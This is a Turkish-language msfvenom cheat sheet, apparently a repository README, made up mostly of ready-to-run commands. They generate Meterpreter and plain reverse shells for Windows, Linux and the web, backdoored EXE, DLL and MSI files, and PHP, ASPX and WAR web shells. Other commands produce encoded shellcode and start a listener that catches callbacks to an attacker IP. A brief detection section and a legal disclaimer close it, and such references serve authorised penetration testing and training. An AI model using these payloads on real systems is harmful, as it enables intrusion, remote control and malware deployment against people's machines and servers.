# 💣 Msfvenom - Kapsamlı Başvuru Rehberi (Cheatsheet)

[🇺🇸 English Version](../README.md)

```
  ███╗   ███╗███████╗███████╗██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗
  ████╗ ████║██╔════╝██╔════╝██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║
  ██╔████╔██║███████╗█████╗  ██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║
  ██║╚██╔╝██║╚════██║██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║
  ██║ ╚═╝ ██║███████║██║      ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
  ╚═╝     ╚═╝╚══════╝╚═╝       ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝
           Metasploit Bağımsız Zararlı Yazılım & Shellcode Üretim Aracı
```

<p align="center">
  <img src="https://img.shields.io/badge/Msfvenom-Payload_Üretici-blue?style=for-the-badge" alt="Msfvenom">
  <img src="https://img.shields.io/badge/Çerçeve-Metasploit-red?style=for-the-badge" alt="Metasploit">
  <img src="https://img.shields.io/badge/Kategori-İstismar_Yükleri-green?style=for-the-badge" alt="Payloads">
  <img src="https://img.shields.io/badge/Çıktı-İkili_%7C_Shellcode_%7C_Web-purple?style=for-the-badge" alt="Formats">
</p>

<p align="center">
  <b>💣 Windows, Linux, macOS, Android ve Web platformları için bağımsız reverse shell, arka kapı (backdoor), kabuk kodu (shellcode) ve kodlayıcı (encoder) üretim rehberi</b>
</p>

---

## 📋 İçindekiler

- [Genel Bakış ve Payload Mimarisi](#-genel-bakış-ve-payload-mimarisi)
  - [Staged ve Stageless Payload Farkı](#staged-ve-stageless-payload-farkı)
- [Temel Parametreler ve Bayraklar](#-temel-parametreler-ve-bayraklar)
- [Windows Payload'ları (EXE, DLL, MSI, PowerShell)](#-windows-payloadları-exe-dll-msi-powershell)
- [Linux ve Unix Payload'ları (ELF, Python, Bash)](#-linux-ve-unix-payloadları-elf-python-bash)
- [Web Uygulaması Payload'ları (PHP, ASP, ASPX, JSP, WAR)](#-web-uygulaması-payloadları-php-asp-aspx-jsp-war)
- [Exploit Geliştirme İçin Shellcode Üretimi (C, Raw, Python)](#-exploit-geliştirme-için-shellcode-üretimi-c-raw-python)
  - [Bozuk Karakterleri Temizleme (`-b`)](#bozuk-karakterleri-temizleme--b)
  - [Kodlayıcılar ve Çoklu Döngü (`-e`, `-i`)](#kodlayıcılar-ve-çoklu-döngü--e--i)
- [Metasploit Multi-Handler Dinleyici Kurulumu](#-metasploit-multi-handler-dinleyici-kurulumu)
- [Hızlı Referans Tablosu](#-hızlı-referans-tablosu)
- [Savunma Yöntemleri ve Tespit](#-savunma-yöntemleri-ve-tespit)
- [Yasal Uyarı](#-yasal-uyarı)

---

## 🎯 Genel Bakış ve Payload Mimarisi

Klasik `msfpayload` ve `msfencode` araçlarının birleşimi olan **msfvenom**, sızma testleri ve güvenlik araştırmaları için çalıştırılabilir ikili dosyalar, betikler ve ham makine kodları üretir.

### Staged ve Stageless Payload Farkı
- **Staged (Kademeli - ör. `windows/x64/meterpreter/reverse_tcp`):**
  İsimlendirmede bölü işareti (`/`) kullanılır. Hedefe ilk giden küçük kod (stage 0), saldırganın dinleyicisine bağlanıp asıl büyük Meterpreter kütüphanesini (stage 1) belleğe çeker. Bellek alanı kısıtlı exploit'ler için uygundur.
- **Stageless (Kademesiz / Tek Parça - ör. `windows/x64/meterpreter_reverse_tcp`):**
  İsimlendirmede alt çizgi (`_`) kullanılır. Tüm Meterpreter yetenekleri doğrudan dosyanın içine gömülüdür. Ağ üzerinden ikinci bir aşama indirmeye ihtiyaç duymadığı için çok daha kararlıdır.

---

## ⚙️ Temel Parametreler ve Bayraklar

```bash
msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<PORT> -f <FORMAT> -o <CIKTI_DOSYASI>
```

| Bayrak | Açıklama |
|--------|----------|
| `-p, --payload` | Kullanılacak payload'ı seçer (`--list payloads` tümünü listeler). |
| `-f, --format` | Çıktı formatı (exe, elf, raw, c, python, asp, aspx, war, php). |
| `-e, --encoder` | Bozuk karakterleri gizlemek için kodlayıcı (`--list encoders`). |
| `-i, --iterations` | Kodlama döngü sayısı. |
| `-b, --bad-chars` | Kabuk kodunda bulunmaması gereken baytlar (ör. `\x00\x0a\x0d`). |
| `-x, --template` | Payload'ın içine enjekte edileceği meşru yürütülebilir dosya şablonu. |
| `-k, --keep` | Şablon programın normal işleyişini yeni bir iş parçacığında (thread) sürdürür. |
| `-o, --out` | Üretilen dosyanın kaydedileceği yol. |

---

## 🪟 Windows Payload'ları (EXE, DLL, MSI, PowerShell)

### Windows x64 Reverse Shell (Stageless Tek Parça)
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe
```

### Windows x64 Kademeli (Staged) Reverse TCP
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o staged.exe
```

### Windows DLL Enjeksiyon Dosyası
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o payload.dll
```

### Windows MSI Yükleyicisi (AlwaysInstallElevated ile Yetki Yükseltme)
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o install.msi
```

### Base64 Kodlu PowerShell Komut Satırı
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f psh-cmd -o run.bat
```

---

## 🐧 Linux ve Unix Payload'ları (ELF, Python, Bash)

### Linux x64 ELF İkili Dosyası (Stageless)
```bash
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf
chmod +x shell.elf
```

### Standart Linux `/bin/sh` Ters Bağlantı (Meterpreter'sız Sade Shell)
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o reverse.elf
```

### Bağımsız Python Ters Bağlantı Betiği
```bash
msfvenom -p cmd/unix/reverse_python LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.py
```

### Saf Bash Tek Satırlık Komutu
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.sh
```

---

## 🌐 Web Uygulaması Payload'ları (PHP, ASP, ASPX, JSP, WAR)

### PHP Reverse Meterpreter
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php
```

### Klasik ASP ve Modern ASPX (IIS Sunucuları)
```bash
# Klasik ASP
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f asp -o shell.asp

# Modern ASPX (.NET)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx -o shell.aspx
```

### Java Tomcat WAR Arşivi
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o webshell.war
```

---

## 🔬 Exploit Geliştirme İçin Shellcode Üretimi (C, Raw, Python)

### Bozuk Karakterleri Temizleme (`-b`)
Null baytlar (`\x00`) veya satır sonu (`\r\n` = `\x0d\x0a`) dizgi tabanlı bellek taşması zafiyetlerini bozar:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -b '\x00\x0a\x0d' -f c -o shellcode.c
```

### Kodlayıcılar ve Çoklu Döngü (`-e`, `-i`)
```bash
# Polimorfik XOR kodlayıcı ile 5 tur kodlama
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 -b '\x00' -f raw -o payload.bin
```

---

## 🎧 Metasploit Multi-Handler Dinleyici Kurulumu

Üretilen bağlantıyı Metasploit üzerinde yakalamak için tek satırlık dinleyici başlatma:

```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run"
```

---

## ⚡ Hızlı Referans Tablosu

| Hedef Ortam | Komut |
|-------------|-------|
| **Windows x64 EXE** | `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o run.exe` |
| **Linux x64 ELF** | `msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o run.elf` |
| **PHP Web Shell** | `msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o shell.php` |
| **ASPX (IIS Web)** | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f aspx -o shell.aspx` |
| **Tomcat WAR** | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=4444 -f war -o shell.war` |
| **C Shellcode** | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -b '\x00' -f c` |
| **PowerShell Tek Satır** | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f psh-cmd` |

---

## 🛡️ Savunma Yöntemleri ve Tespit

1. **Statik İmza Tespiti:** Standart Msfvenom şablonları ve `shikata_ga_nai` kodlayıcısı günümüz antivirüs yazılımları tarafından anında statik imza ile yakalanır.
2. **EDR Davranışsal Analizi:** Web sunucusu süreçlerinin (`w3wp.exe`, `tomcat`) alt süreç olarak `cmd.exe` veya `powershell.exe` başlatması EDR sistemlerince yüksek öncelikli alarm üretir.

---

## ⚠️ Yasal Uyarı

> [!CAUTION]
> Msfvenom işlevsel saldırı yükleri ve zararlı yazılımlar üretir. Yalnızca yasal izin alınmış sızma testlerinde ve izole laboratuvar ortamlarında kullanılmalıdır. İzniniz olmayan sistemlerde çalıştırılması suçtur.
